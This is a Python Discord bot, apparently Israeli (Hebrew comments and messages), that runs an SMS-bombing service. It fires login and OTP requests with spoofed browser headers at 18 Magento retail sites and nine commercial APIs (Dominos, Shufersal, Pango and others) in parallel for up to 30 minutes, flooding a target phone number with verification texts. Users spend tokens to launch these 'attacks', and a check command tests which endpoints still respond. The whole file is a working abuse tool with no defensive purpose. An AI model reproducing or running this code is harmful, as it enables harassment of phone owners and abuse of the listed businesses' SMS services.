import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json

logging.basicConfig(level=logging.INFO)

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE")

bot = CyberBot()

# ========== MAGENTO CLUSTER ==========
MAGENTO_SITES = [
    "https://www.castro.com/customer/ajax/post/",
    "https://www.hoodies.co.il/customer/ajax/post/",
    "https://www.urbanica-wh.com/customer/ajax/post/",
    "https://www.crazyline.com/customer/ajax/post/",
    "https://www.onot.co.il/customer/ajax/post/",
    "https://www.timberland.co.il/customer/ajax/post/",
    "https://www.adikastyle.com/customer/ajax/post/",
    "https://www.weshoes.co.il/customer/ajax/post/",
    "https://www.ninewest.co.il/customer/ajax/post/",
    "https://www.fixunderwear.com/customer/ajax/post/",
    "https://www.intima-il.co.il/customer/ajax/post/",
    "https://www.gali.co.il/customer/ajax/post/",
    "https://www.golf-il.co.il/customer/ajax/post/",
    "https://www.kiwi-kids.co.il/customer/ajax/post/",
    "https://www.delta.co.il/customer/ajax/post/",
    "https://www.storyonline.co.il/customer/ajax/post/",
    "https://www.nautica.co.il/customer/ajax/post/",
    "https://www.lee-cooper.co.il/customer/ajax/post/"
]

# ========== ADVANCED APIs ==========
ADVANCED_APIS = [
    {
        "name": "Hamal",
        "url": "https://users-auth.hamal.co.il/auth/send-auth-code",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://hamal.co.il",
            "Referer": "https://hamal.co.il/"
        },
        "data": {"value": "PHONE", "type": "phone", "projectId": "1"}
    },
    {
        "name": "Mishloha",
        "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://mishloha.co.il",
            "Referer": "https://mishloha.co.il/"
        },
        "data": {"phoneNumber": "PHONE"}
    },
    {
        "name": "Dominos",
        "url": "https://api.dominos.co.il/sendOtp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://www.dominos.co.il",
            "Referer": "https://www.dominos.co.il/"
        },
        "data": {"otpMethod": "text", "customerId": "PHONE", "language": "he", "requestNum": 8}
    },
    {
        "name": "BurgerAnch",
        "url": "https://app.burgeranch.co.il/_a/aff_otp_auth",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://burgeranch.co.il",
            "Referer": "https://burgeranch.co.il/"
        },
        "data": "phone=PHONE",
        "is_form": True
    },
    {
        "name": "Ivory",
        "url": "https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/PHONE",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Origin": "https://www.ivory.co.il",
            "Referer": "https://www.ivory.co.il/"
        },
        "is_get": True
    },
    {
        "name": "Hopon",
        "url": "https://api.hopon.co.il/v0.15/1/isr/users",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://hopon.co.il",
            "Referer": "https://hopon.co.il/"
        },
        "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": "PHONE", "phoneCall": False}
    },
    {
        "name": "10bis",
        "url": "https://www.10bis.co.il/api/register",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://www.10bis.co.il",
            "Referer": "https://www.10bis.co.il/"
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "Shufersal",
        "url": "https://www.shufersal.co.il/api/v1/auth/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://www.shufersal.co.il",
            "Referer": "https://www.shufersal.co.il/"
        },
        "data": {"phone": "PHONE_RAW"}
    },
    {
        "name": "Pango",
        "url": "https://api.pango.co.il/auth/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://www.pango.co.il",
            "Referer": "https://www.pango.co.il/"
        },
        "data": {"phoneNumber": "PHONE_RAW"}
    }
]

# ========== פונקציות שליחה ==========
async def fast_magento_shot(session, url, phone_raw):
    """ירייה מהירה למג'נטו"""
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    try:
        async with session.post(url, data=data, headers=headers, timeout=3) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

async def fast_advanced_shot(session, api, phone, phone_raw):
    """ירייה מהירה ל-API מתקדם"""
    try:
        if api.get("is_get", False):
            url = api["url"].replace("PHONE", phone)
            async with session.get(url, headers=api["headers"], timeout=3) as resp:
                return resp.status in [200, 201, 202, 204]
        elif api.get("is_form", False):
            url = api["url"]
            data = api["data"].replace("PHONE", phone)
            async with session.post(url, data=data, headers=api["headers"], timeout=3) as resp:
                return resp.status in [200, 201, 202, 204]
        else:
            url = api["url"]
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone)
            data_str = data_str.replace("PHONE_RAW", phone_raw)
            data = json.loads(data_str)
            async with session.post(url, json=data, headers=api["headers"], timeout=3) as resp:
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== מתקפה ==========
async def run_attack(phone, duration_mins, user_id, interaction):
    """הרצת מתקפה"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    rounds = 0
    
    # עדכון ראשוני - פעם אחת בלבד
    await interaction.followup.send(
        f"⚡ **מתקפה הופעלה!**\n"
        f"📱 טלפון: {phone}\n"
        f"⏱️ משך: {duration_mins} דקות",
        ephemeral=True
    )
    
    logging.info(f"⚡ Attack started - Phone: {phone}")
    
    # 5 סשנים במקביל
    sessions = [aiohttp.ClientSession() for _ in range(5)]
    
    try:
        while datetime.now() < end_time:
            rounds += 1
            round_tasks = []
            
            # שליחה לכל האתרים
            for session in sessions:
                for url in MAGENTO_SITES:
                    round_tasks.append(fast_magento_shot(session, url, phone_raw))
                for api in ADVANCED_APIS:
                    round_tasks.append(fast_advanced_shot(session, api, phone, phone_raw))
            
            # הרצת כל המשימות
            results = await asyncio.gather(*round_tasks, return_exceptions=True)
            round_success = sum(1 for r in results if r is True)
            total_sent += round_success
            
            # עדכון כל 30 שניות
            if rounds % 30 == 0:
                minutes_passed = (datetime.now() - (end_time - timedelta(minutes=duration_mins))).seconds // 60
                rate = total_sent // (minutes_passed + 1)
                
                try:
                    await interaction.followup.send(
                        f"📊 **{minutes_passed} דקות**: {total_sent} הודעות ({rate}/שניה)",
                        ephemeral=True
                    )
                except:
                    pass
            
            # המתנה של שניה בין גלים
            await asyncio.sleep(1)
    
    finally:
        for session in sessions:
            await session.close()
    
    # סיכום
    try:
        await interaction.followup.send(
            f"✅ **הסתיים!** סה\"כ {total_sent} הודעות",
            ephemeral=True
        )
    except:
        pass
    
    logging.info(f"✅ Attack completed - Total: {total_sent}")

# ========== פקודת בדיקה ==========
@bot.tree.command(name="check_api", description="בדוק אילו APIs עובדים")
async def check_api(interaction: discord.Interaction):
    """בודק את כל ה-APIs"""
    
    await interaction.response.send_message("🔍 מתחיל בדיקה...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    working = []
    failed = []
    
    # בדיקת מג'נטו
    async with aiohttp.ClientSession() as session:
        for url in MAGENTO_SITES:
            site_name = url.split("//")[1].split(".")[0]
            success = await fast_magento_shot(session, url, test_raw)
            
            if success:
                working.append(f"✅ {site_name}")
            else:
                failed.append(f"❌ {site_name}")
            
            await asyncio.sleep(0.2)
    
    # בדיקת APIs מתקדמים
    async with aiohttp.ClientSession() as session:
        for api in ADVANCED_APIS:
            success = await fast_advanced_shot(session, api, test_phone, test_raw)
            
            if success:
                working.append(f"✅ {api['name']}")
            else:
                failed.append(f"❌ {api['name']}")
            
            await asyncio.sleep(0.2)
    
    # דוח
    report = f"**📊 תוצאות בדיקה**\n\n"
    report += f"**עובדים ({len(working)}):**\n"
    report += "\n".join(working[:15])
    
    if len(working) > 15:
        report += f"\n... ועוד {len(working)-15}"
    
    report += f"\n\n**לא עובדים ({len(failed)}):**\n"
    report += "\n".join(failed[:10])
    
    await interaction.followup.send(report, ephemeral=True)

# ========== ממשק משתמש ==========
class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
    phone = ui.TextInput(label="📱 מספר טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ משך בדקות", default="5", placeholder="1-30")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב להתחיל ב-972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 30:
                await interaction.response.send_message("❌ משך חייב להיות 1-30 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ משך לא תקין", ephemeral=True)
            return
        
        # בדיקת טוקנים
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 10})
            user_doc = {"tokens": 10}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין לך טוקנים!", ephemeral=True)
            return
        
        # הורדת טוקן
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        # תשובה ראשונית
        await interaction.response.send_message(
            f"🚀 **מתקפה הופעלה!**\n📱 {phone}\n⏱️ {duration} דקות\n💎 נותרו: {user_doc['tokens']-1}",
            ephemeral=True
        )
        
        # הפעלת המתקפה
        asyncio.create_task(run_attack(phone, duration, user_id, interaction))

@bot.tree.command(name="setup", description="פתח פאנל שליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 15})
        tokens = 15
    else:
        tokens = user_doc.get("tokens", 0)
    
    embed = discord.Embed(
        title="⚡ OMNI TOTAL WAR",
        description=f"**{len(MAGENTO_SITES)}** מג'נטו + **{len(ADVANCED_APIS)}** APIs",
        color=0x00ff00
    )
    embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
    
    view = discord.ui.View()
    attack_btn = discord.ui.Button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger)
    
    async def attack_callback(inter):
        await inter.response.send_modal(AttackModal())
    
    attack_btn.callback = attack_callback
    view.add_item(attack_btn)
    
    check_btn = discord.ui.Button(label="🔍 בדוק APIs", style=discord.ButtonStyle.secondary)
    async def check_callback(inter):
        await check_api(inter)
    check_btn.callback = check_callback
    view.add_item(check_btn)
    
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="tokens", description="בדוק טוקנים")
async def tokens(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 0) if user_doc else 0
    
    await interaction.response.send_message(f"💎 **הטוקנים שלך:** {tokens}", ephemeral=True)

if __name__ == "__main__":
    logging.info("🚀 Starting OMNI TOTAL WAR...")
    bot.run(TOKEN)
